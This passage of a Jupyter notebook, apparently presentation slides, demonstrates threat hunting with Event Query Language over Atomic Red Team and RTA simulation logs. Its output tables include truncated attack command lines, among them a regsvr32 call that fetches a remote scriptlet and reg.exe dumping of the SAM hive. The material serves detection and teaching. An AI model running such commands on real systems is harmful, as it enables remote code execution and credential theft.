       "1   svchost.exe  2664                                                   \n",
       "2  regsvr32.exe  2012  regsvr32.exe  /s /u /i:https://raw.githubuserc...\n",
       "3  schtasks.exe  2812  SCHTASKS  /Create /S localhost /RU DOMAIN\\user..."
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table = eql_search(\"data/normalized-atomic-red-team.json.gz\", \"\"\"\n",
    "any where true\n",
    "| unique event_type, unique_pid\n",
    "| unique_count unique_pid\n",
    "| filter count > 3\n",
    "\"\"\")\n",
    "table[['process_name', 'pid', 'command_line']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What processes were spawned from parents that made network activity?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>process_name</th>\n",
       "      <th>pid</th>\n",
       "      <th>ppid</th>\n",
       "      <th>command_line</th>\n",
       "      <th>destination_address</th>\n",
       "      <th>destination_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>regsvr32.exe</td>\n",
       "      <td>2012</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>151.101.48.133</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>calc.exe</td>\n",
       "      <td>4724</td>\n",
       "      <td>2012</td>\n",
       "      <td>\"C:\\Windows\\System32\\calc.exe\"</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>powershell.exe</td>\n",
       "      <td>7036</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>151.101.48.133</td>\n",
       "      <td>443</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>cmd.exe</td>\n",
       "      <td>1480</td>\n",
       "      <td>7036</td>\n",
       "      <td>\"C:\\WINDOWS\\system32\\cmd.exe\" /c \"sc.exe creat...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "     process_name   pid  ppid  \\\n",
       "0    regsvr32.exe  2012         \n",
       "1        calc.exe  4724  2012   \n",
       "2  powershell.exe  7036         \n",
       "3         cmd.exe  1480  7036   \n",
       "\n",
       "                                        command_line destination_address  \\\n",
       "0                                                         151.101.48.133   \n",
       "1                    \"C:\\Windows\\System32\\calc.exe\"                        \n",
       "2                                                         151.101.48.133   \n",
       "3  \"C:\\WINDOWS\\system32\\cmd.exe\" /c \"sc.exe creat...                       \n",
       "\n",
       "  destination_port  \n",
       "0              443  \n",
       "1                   \n",
       "2              443  \n",
       "3                   "
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table = eql_search(\"data/normalized-atomic-red-team.json.gz\", \"\"\"\n",
    "join\n",
    "  [ network where true ] by pid\n",
    "  [ process where true ] by ppid\n",
    "\"\"\")\n",
    "table[['process_name', 'pid', 'ppid', 'command_line', 'destination_address', 'destination_port']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What files were created by descendants of powershell.exe?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>file_path</th>\n",
       "      <th>pid</th>\n",
       "      <th>process_name</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Pr...</td>\n",
       "      <td>7036</td>\n",
       "      <td>powershell.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>C:\\eqllib\\atomic-red-team-master\\atomics\\key.snk</td>\n",
       "      <td>7036</td>\n",
       "      <td>powershell.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>C:\\Windows\\cert.key</td>\n",
       "      <td>3668</td>\n",
       "      <td>cmd.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>C:\\Users\\bob\\AppData\\Local\\Temp\\REGC0BC.tmp</td>\n",
       "      <td>6700</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>C:\\Users\\bob\\AppData\\Local\\Temp\\REGC0BC.tmp</td>\n",
       "      <td>6700</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>C:\\eqllib\\atomic-red-team-master\\atomics\\secur...</td>\n",
       "      <td>6700</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>C:\\Users\\bob\\AppData\\Local\\Temp\\REGCD01.tmp</td>\n",
       "      <td>2008</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>C:\\Users\\bob\\AppData\\Local\\Temp\\REGCD01.tmp</td>\n",
       "      <td>2008</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>C:\\eqllib\\atomic-red-team-master\\atomics\\syste...</td>\n",
       "      <td>2008</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>C:\\Users\\bob\\AppData\\Local\\Temp\\REGD250.tmp</td>\n",
       "      <td>2160</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>C:\\Users\\bob\\AppData\\Local\\Temp\\REGD250.tmp</td>\n",
       "      <td>2160</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>C:\\eqllib\\atomic-red-team-master\\atomics\\sam.hive</td>\n",
       "      <td>2160</td>\n",
       "      <td>reg.exe</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>C:\\Users\\bob\\AppData\\Local\\Temptcm.tmp</td>\n",
       "      <td>3452</td>\n",
       "      <td>cmd.exe</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            file_path   pid    process_name\n",
       "0   C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Pr...  7036  powershell.exe\n",
       "1    C:\\eqllib\\atomic-red-team-master\\atomics\\key.snk  7036  powershell.exe\n",
       "2                                 C:\\Windows\\cert.key  3668         cmd.exe\n",
       "3         C:\\Users\\bob\\AppData\\Local\\Temp\\REGC0BC.tmp  6700         reg.exe\n",
       "4         C:\\Users\\bob\\AppData\\Local\\Temp\\REGC0BC.tmp  6700         reg.exe\n",
       "5   C:\\eqllib\\atomic-red-team-master\\atomics\\secur...  6700         reg.exe\n",
       "6         C:\\Users\\bob\\AppData\\Local\\Temp\\REGCD01.tmp  2008         reg.exe\n",
       "7         C:\\Users\\bob\\AppData\\Local\\Temp\\REGCD01.tmp  2008         reg.exe\n",
       "8   C:\\eqllib\\atomic-red-team-master\\atomics\\syste...  2008         reg.exe\n",
       "9         C:\\Users\\bob\\AppData\\Local\\Temp\\REGD250.tmp  2160         reg.exe\n",
       "10        C:\\Users\\bob\\AppData\\Local\\Temp\\REGD250.tmp  2160         reg.exe\n",
       "11  C:\\eqllib\\atomic-red-team-master\\atomics\\sam.hive  2160         reg.exe\n",
       "12             C:\\Users\\bob\\AppData\\Local\\Temptcm.tmp  3452         cmd.exe"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table = eql_search(\"data/normalized-atomic-red-team.json.gz\", \"\"\"\n",
    "file where process_name == 'powershell.exe' or\n",
    "    descendant of [process_name == 'powershell.exe']\n",
    "\"\"\")\n",
    "table[['file_path', 'pid', 'process_name']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What executables were dropped then executed? "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>process_name</th>\n",
       "      <th>file_path</th>\n",
       "      <th>command_line</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>python.exe</td>\n",
       "      <td>C:\\eqllib\\RTA-master\\winword.exe</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>winword.exe</td>\n",
       "      <td></td>\n",
       "      <td>C:\\eqllib\\RTA-master\\winword.exe /c msiexec.ex...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>python.exe</td>\n",
       "      <td>C:\\eqllib\\RTA-master\\excel.exe</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>excel.exe</td>\n",
       "      <td></td>\n",
       "      <td>C:\\eqllib\\RTA-master\\excel.exe /c msiexec.exe ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>python.exe</td>\n",
       "      <td>C:\\eqllib\\RTA-master\\red_ttp\\bginfo.exe</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>bginfo.exe</td>\n",
       "      <td></td>\n",
       "      <td>C:\\eqllib\\RTA-master\\red_ttp\\bginfo.exe -c \"im...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>python.exe</td>\n",
       "      <td>C:\\eqllib\\RTA-master\\red_ttp\\rcsi.exe</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>rcsi.exe</td>\n",
       "      <td></td>\n",
       "      <td>C:\\eqllib\\RTA-master\\red_ttp\\rcsi.exe -c \"impo...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>python.exe</td>\n",
       "      <td>C:\\eqllib\\RTA-master\\red_ttp\\control.exe</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>control.exe</td>\n",
       "      <td></td>\n",
       "      <td>C:\\eqllib\\RTA-master\\red_ttp\\control.exe -c \"i...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>python.exe</td>\n",
       "      <td>C:\\eqllib\\RTA-master\\red_ttp\\odbcconf.exe</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>odbcconf.exe</td>\n",
       "      <td></td>\n",
       "      <td>C:\\eqllib\\RTA-master\\red_ttp\\odbcconf.exe -c \"...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    process_name                                  file_path  \\\n",
       "0     python.exe           C:\\eqllib\\RTA-master\\winword.exe   \n",
       "1    winword.exe                                              \n",
       "2     python.exe             C:\\eqllib\\RTA-master\\excel.exe   \n",
       "3      excel.exe                                              \n",
       "4     python.exe    C:\\eqllib\\RTA-master\\red_ttp\\bginfo.exe   \n",
       "5     bginfo.exe                                              \n",
       "6     python.exe      C:\\eqllib\\RTA-master\\red_ttp\\rcsi.exe   \n",
       "7       rcsi.exe                                              \n",
       "8     python.exe   C:\\eqllib\\RTA-master\\red_ttp\\control.exe   \n",
       "9    control.exe                                              \n",
       "10    python.exe  C:\\eqllib\\RTA-master\\red_ttp\\odbcconf.exe   \n",
       "11  odbcconf.exe                                              \n",
       "\n",
       "                                         command_line  \n",
       "0                                                      \n",
       "1   C:\\eqllib\\RTA-master\\winword.exe /c msiexec.ex...  \n",
       "2                                                      \n",
       "3   C:\\eqllib\\RTA-master\\excel.exe /c msiexec.exe ...  \n",
       "4                                                      \n",
       "5   C:\\eqllib\\RTA-master\\red_ttp\\bginfo.exe -c \"im...  \n",
       "6                                                      \n",
       "7   C:\\eqllib\\RTA-master\\red_ttp\\rcsi.exe -c \"impo...  \n",
       "8                                                      \n",
       "9   C:\\eqllib\\RTA-master\\red_ttp\\control.exe -c \"i...  \n",
       "10                                                     \n",
       "11  C:\\eqllib\\RTA-master\\red_ttp\\odbcconf.exe -c \"...  "
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table = eql_search(\"data/normalized-rta.json.gz\", \"\"\"\n",
    "sequence\n",
    "   [ file where file_name == \"*.exe\"] by file_path\n",
    "   [ process where true] by process_path\n",
    "\"\"\")\n",
    "table[['process_name', 'file_path', 'command_line']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What if we want to find spearsphishing?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>command_line</th>\n",
       "      <th>event_type</th>\n",
       "      <th>logon_id</th>\n",
       "      <th>parent_process_name</th>\n",
       "      <th>parent_process_path</th>\n",
       "      <th>pid</th>\n",
       "      <th>ppid</th>\n",
       "      <th>process_name</th>\n",
       "      <th>process_path</th>\n",
       "      <th>subtype</th>\n",
       "      <th>timestamp</th>\n",
       "      <th>unique_pid</th>\n",
       "      <th>unique_ppid</th>\n",
       "      <th>user</th>\n",
       "      <th>user_domain</th>\n",
       "      <th>user_name</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>wscript.exe  //b</td>\n",
       "      <td>process</td>\n",
       "      <td>92940</td>\n",
       "      <td>winword.exe</td>\n",
       "      <td>C:\\eqllib\\RTA-master\\winword.exe</td>\n",
       "      <td>7020</td>\n",
       "      <td>7044</td>\n",
       "      <td>wscript.exe</td>\n",
       "      <td>C:\\Windows\\System32\\wscript.exe</td>\n",
       "      <td>create</td>\n",
       "      <td>131883577456140000</td>\n",
       "      <td>{9C977984-CD71-5C05-0000-001010416F01}</td>\n",
       "      <td>{9C977984-CD71-5C05-0000-0010E83F6F01}</td>\n",
       "      <td>RTA-DESKTOP\\alice</td>\n",
       "      <td>RTA-DESKTOP</td>\n",
       "      <td>alice</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       command_line event_type  logon_id parent_process_name  \\\n",
       "0  wscript.exe  //b    process     92940         winword.exe   \n",
       "\n",
       "                parent_process_path   pid  ppid process_name  \\\n",
       "0  C:\\eqllib\\RTA-master\\winword.exe  7020  7044  wscript.exe   \n",
       "\n",
       "                      process_path subtype           timestamp  \\\n",
       "0  C:\\Windows\\System32\\wscript.exe  create  131883577456140000   \n",
       "\n",
       "                               unique_pid  \\\n",
       "0  {9C977984-CD71-5C05-0000-001010416F01}   \n",
       "\n",
       "                              unique_ppid               user  user_domain  \\\n",
       "0  {9C977984-CD71-5C05-0000-0010E83F6F01}  RTA-DESKTOP\\alice  RTA-DESKTOP   \n",
       "\n",
       "  user_name  \n",
       "0     alice  "
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table = eql_search(\"data/normalized-rta.json.gz\", \"\"\"\n",
    "process where subtype == 'create' and process_name == \"wscript.exe\"\n",
    "  and descendant of [\n",
    "    process where process_name == \"winword.exe\"\n",
    "  ]\n",
    "\"\"\")\n",
    "table"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "macros = \"\"\"\n",
    "macro SCRIPTING_PROCESS(name)\n",
    "   name in (\"wscript.exe\", \"cscript.exe\", \"powershell.exe\")\n",
    "\n",
    "macro OFFICE_PROCESS(name)\n",
    "   name in (\"winword.exe\", \"outlook.exe\", \"powerpoint.exe\", \"excel.exe\")\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>parent_process_name</th>\n",
       "      <th>command_line</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>winword.exe</td>\n",
       "      <td>powershell.exe  exit</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>winword.exe</td>\n",
       "      <td>wscript.exe  //b</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>excel.exe</td>\n",
       "      <td>powershell.exe  exit</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>excel.exe</td>\n",
       "      <td>wscript.exe  //b</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "  parent_process_name          command_line\n",
       "0         winword.exe  powershell.exe  exit\n",
       "1         winword.exe      wscript.exe  //b\n",
       "2           excel.exe  powershell.exe  exit\n",
       "3           excel.exe      wscript.exe  //b"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table = eql_search(\"data/normalized-rta.json.gz\", \"\"\"\n",
    "\n",
    "process where subtype=='create'\n",
    "  and SCRIPTING_PROCESS(process_name)\n",
    "  and descendant of\n",
    "    [process where OFFICE_PROCESS(process_name)]\n",
    "    \n",
    "\"\"\", {\"definitions\": macros})\n",
    "\n",
    "table[['parent_process_name', 'command_line']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![all-the-things](https://imgflip.com/s/meme/X-All-The-Y.jpg)\n",
    "```console\n",
    "$ eqllib survey -f data/normalized-atomic-red-team.json.gz -c\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "results = DataFrame([\n",
    "    {\"count\": 1, \"key\": [\"Indirect Command Execution\", \"884a7ccd-7305-4130-82d0-d4f90bc118b6\"], \"percent\": 0.08333333333333333},\n",
    "    {\"count\": 1, \"key\": [\"Mounting Hidden Shares\", \"9b3dd402-891c-4c4d-a662-28947168ce61\"], \"percent\": 0.08333333333333333},\n",
    "    {\"count\": 1, \"key\": [\"Suspicious Bitsadmin Job via bitsadmin.exe\", \"ef9fe5c0-b16f-4384-bb61-95977799a84c\"], \"percent\": 0.08333333333333333},\n",
    "    {\"count\": 2, \"key\": [\"RegSvr32 Scriplet Execution\", \"82200c71-f3c3-4b6c-aead-9cafeab602f5\"], \"percent\": 0.16666666666666666},\n",
    "    {\"count\": 2, \"key\": [\"Suspicious Script Object Execution\", \"a792cb37-fa56-43c2-9357-4b6a54b559c7\"], \"percent\": 0.16666666666666666},\n",
    "    {\"count\": 2, \"key\": [\"Windows Network Enumeration\", \"b8a94d2f-dc75-4630-9d73-1edc6bd26fff\"], \"percent\": 0.16666666666666666},\n",
    "    {\"count\": 3, \"key\": [\"SAM Dumping via Reg.exe\", \"aed95fc6-5e3f-49dc-8b35-06508613f979\"], \"percent\": 0.25},\n",
    "])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>count</th>\n",
       "      <th>key</th>\n",
       "      <th>percent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>[Indirect Command Execution, 884a7ccd-7305-413...</td>\n",
       "      <td>0.083333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>[Mounting Hidden Shares, 9b3dd402-891c-4c4d-a6...</td>\n",
       "      <td>0.083333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1</td>\n",
       "      <td>[Suspicious Bitsadmin Job via bitsadmin.exe, e...</td>\n",
       "      <td>0.083333</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>2</td>\n",
       "      <td>[RegSvr32 Scriplet Execution, 82200c71-f3c3-4b...</td>\n",
       "      <td>0.166667</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>2</td>\n",
       "      <td>[Suspicious Script Object Execution, a792cb37-...</td>\n",
       "      <td>0.166667</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>2</td>\n",
       "      <td>[Windows Network Enumeration, b8a94d2f-dc75-46...</td>\n",
       "      <td>0.166667</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>3</td>\n",
       "      <td>[SAM Dumping via Reg.exe, aed95fc6-5e3f-49dc-8...</td>\n",
       "      <td>0.250000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   count                                                key   percent\n",
       "0      1  [Indirect Command Execution, 884a7ccd-7305-413...  0.083333\n",
       "1      1  [Mounting Hidden Shares, 9b3dd402-891c-4c4d-a6...  0.083333\n",
       "2      1  [Suspicious Bitsadmin Job via bitsadmin.exe, e...  0.083333\n",
       "3      2  [RegSvr32 Scriplet Execution, 82200c71-f3c3-4b...  0.166667\n",
       "4      2  [Suspicious Script Object Execution, a792cb37-...  0.166667\n",
       "5      2  [Windows Network Enumeration, b8a94d2f-dc75-46...  0.166667\n",
       "6      3  [SAM Dumping via Reg.exe, aed95fc6-5e3f-49dc-8...  0.250000"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "results"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "![](https://github.com/endgameinc/eql/raw/master/docs/_static/eql.png)\n",
    "[@eventquerylang](https://twitter.com/eventquerylang)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Resources\n",
    "\n",
    "- https://eql.readthedocs.io\n",
    "- https://eqllib.readthedocs.io\n",
    "- https://github.com/endgameinc/eql\n",
    "- https://github.com/endgameinc/eqllib\n",
    "- https://www.endgame.com/blog/technical-blog/introducing-event-query-language\n",
    "- https://www.endgame.com/blog/technical-blog/eql-for-the-masses\n",
    "- https://www.endgame.com/blog/technical-blog/getting-started-eql"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
